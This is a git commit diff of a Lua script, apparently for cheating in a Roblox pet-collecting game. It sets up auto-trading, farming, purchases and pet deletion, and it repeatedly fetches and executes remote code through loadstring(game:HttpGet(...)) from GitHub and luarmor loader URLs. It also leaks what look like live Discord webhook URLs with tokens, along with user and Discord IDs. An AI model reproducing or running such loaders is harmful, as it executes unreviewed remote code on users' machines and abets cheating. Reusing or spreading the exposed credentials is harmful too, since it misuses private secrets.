40e0ae6938fc672ad864d4ca09f4e0ccaad4b394
thangvo123 <94835684+thangvo123@users.noreply.github.com>
2025-06-17 15:28:22 +0700

    Update puppyontop.lua

--- puppyontop.lua
+++ puppyontop.lua
@@ -1,3 +1,4 @@
+_G.Config = { UserID = "3bf97fad-2915-4197-8a14-81872043402d", discord_id = "1165842656958611546" , Note = "PUPPY", } loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/bgsi"))()
 script_key = getgenv().AutoTrade;
 getgenv().Config = {
     MainReceive = getgenv().MainReceiveUsers,
@@ -6,87 +7,76 @@ getgenv().Config = {
             { Name = "Avernus" },
         },
         ["normalPets"] = {
-
+            
         }
     }
 }
-
 task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/793674f6bc0a80e1c748fd75994d1607.lua"))()
 end)
 task.wait(120)
-setfpscap(4)
-wait(15)
-script_key = getgenv().DuckHub;
-getgenv().UserConfig = {
-    AddFriends          = true,
-    RedeemCode = {"RELEASE","Lucky", "update2","Easter","Sylentlyssorry", "update4"},
-    EquipBestFlavorGum  = true,
-    BuyFlavorGum        = true,
-    AutoMinigames       = true,
-    AutoRollDice        = true,
-    ["Super Ticket"]    = "Robot Claw",
-    ["Use Super Ticket"] = true,
-    ["Season Challenges"] = false, -- false bc ss end 
-    ["Force X2"] = true,
-    ["Giant Chest"] = false,
-    ["Void Chest"] = false,
-    ["Golden Chest"] = false,
-    ["Royal Chest"] = true,
-    ["Dice Chest"] = true, -- default is false if not set
-    ["Summer Shop"] = true, -- default is true if not set
-    ["Force X2"] = true,
-    ["Mastery"] = {Pets = 15,Buffs = 15,Shops = 10},
-    ["Craft Potions"] = {
-        Enable = false,
-        MinGems = "100k",
-        ["Potion Needed"] = {
-            {"Coins", Level = 5},
-            {"Speed", Level = 5},
-            {"Lucky", Level = 5},
-            {"Mythic", Level = 5}
-        }
-    },
-    ["Star Shop"] = {
-        Enable = true,
-        MinStars = 100,
-        ["Items Needed"] = {
-            "Speed V",
-            "Lucky V",
-            "Mythic V"
-        }
-    },
-    ["Rifts"] = {
-        AlwaysFindRifts = true,
-        Targets = {"Fossil Egg"},
-        Luck = 5 -- dont change
-    },
-    ["Secret Bounty"] = {"Everblaze"},
-    ["Secret Bounty x1 Egg"] = false, -- true = 100% Secret Bounty
-    ["Skip Event"] = "All", -- All: skip event seashells, Jungle: skip new island event seashells, None: not skip event seashells
-    ["Light and Dark"]  = "Both", -- Both: hatch Light and Dark, Light Egg: only hatch if available, Dark Egg: only hatch if available
-    FindDuck = "Fossil Egg", -- Fruit Egg, Nightmare Egg, Common Egg, Cyber Egg, Neon Egg
-    ["Replace FindDuck"] = "Fossil Egg",
-    ["Best Potions Find Duck"] = true, --false if there are only few potions 
-    ["Enchant Team 1"] = {enable = true, ["team-up"] = 1}, -- can set 2 or 3
-    ["Min gems"] = "1m",
-    ["Min coins"] = "100m",
-    ["Min tickets"] = "10m",
-    ["Min seashells"] = "100b",
-    ["Gems coefficient"] = 0,
-    ["Tickets coefficient"] = 100,
-    ["Seashells coefficient"] = 24,
-    ["Auto Restart"] = true,
-    ["Webhook"] = {
-        Enable = true,
-        Note = "Puppy on top",
-        ID = "1165842656958611546",
-        URL = "https://discord.com/api/webhooks/1311251398515626004/SMZF9yzSDdBh5YZr8shm7ZPVz4aPDU3E5SnPPKGvZyzWYCrEJLU2-3G9dUa0fEoHhS90",
-        Rarity = {
-            "Secret"
-        }, -- General rarity filter
-        Legendary = "1000b",
-        ["Special Pets"] = {"Monolith"}
-    }
+
+
+local allowedUsernames = {
+["systemNvXkS"] = true,
 }
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ccbddd87670e37be6aa0dbf793748a94.lua"))()
+
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+if allowedUsernames[localPlayer.Name] then
+   print("systemNvXkS")
+else
+script_key = getgenv().Marmot;
+setfpscap(3)  -- number = fps
+
+getgenv().bgsInfConfig = {
+    SHOW_MULTIPLIER = true,
+    ADD_FRIEND = true,
+    ENABLE_EXIT = true,
+    IGNORE_SEASON_CHALLENGES = true,
+    SUPER_TICKET_MINIGAME = "Robot Claw",
+    STOP_MINIGAME_INFINITY_ELIXIR = 10,
+    AUTO_UPDATE_RESTART = false,
+
+    PURCHASE_ALIENSHOP = true,
+    PURCHASE_BLACKMARKET = true,
+    PURCHASE_DICE_MERCHANT = true,
+    PURCHASE_EVENT_SHOP = true,
+    PURCHASE_TRAVELING_MERCHANT = true,
+    PURCHASE_STARSHOP_SLOT = 14,
+    RESTOCK_SHOP = "Event Merchant",
+
+    USE_ROYAL_KEY = true,
+    USE_GOLDEN_KEY = true,
+    USE_DICE_KEY = true,
+    USE_MYSTERY_BOX = true,
+
+    RARITY_TO_DELETE = {"Common", "Unique", "Rare", "Epic", "Legendary"},
+    RARITY_TO_SHINY = {"Common", "Unique", "Rare", "Epic", "Legendary"},
+    MAX_LEGENDARY_TIER_TO_DELETE = 2,  -- (DO NOT Delete Tier 3+ shiny & mythic, use PETS_TO_DELETE instead)
+    DELETE_LEGENDARY_SHINY = true,
+    DELETE_LEGENDARY_MYTHIC = true,
+
+    ENCHANT_HIGH_ROLLER = true,
+
+    AUTO_BOUNTY_RIFT = true,
+    HATCH_1X_EGG = {"Lunar Egg"}, 
+    MIN_COINS_BEFORE_HATCHING = "100b",
+    ALWAYS_INFINITY_ELIXIR = true,
+    ALWAYS_EGG_ELIXIR = true,
+
+    MASTERY_PETS_LEVEL = 15,   
+    MASTERY_BUFFS_LEVEL = 15,  
+    MASTERY_SHOPS_LEVEL = 10,  
+    MASTERY_MINIGAMES_LEVEL = 8,
+
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1312400404574896168/48jSW36vS50cezaL3dBygAZd_NXtwmL8RuDMW2dR6G5bG4PcJIhM351ac42Dbe4XQiAZ",
+    DISCORD_ID = "1165842656958611546",
+    WEBHOOK_NOTE = "PUPPY",
+    WEBHOOK_ODDS = "1000b",
+    SHOW_PET_WEBHOOK_USERNAME = true,
+}
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3dc52e6a2fc4f671b66757e93f4fd38b.lua"))()
+end
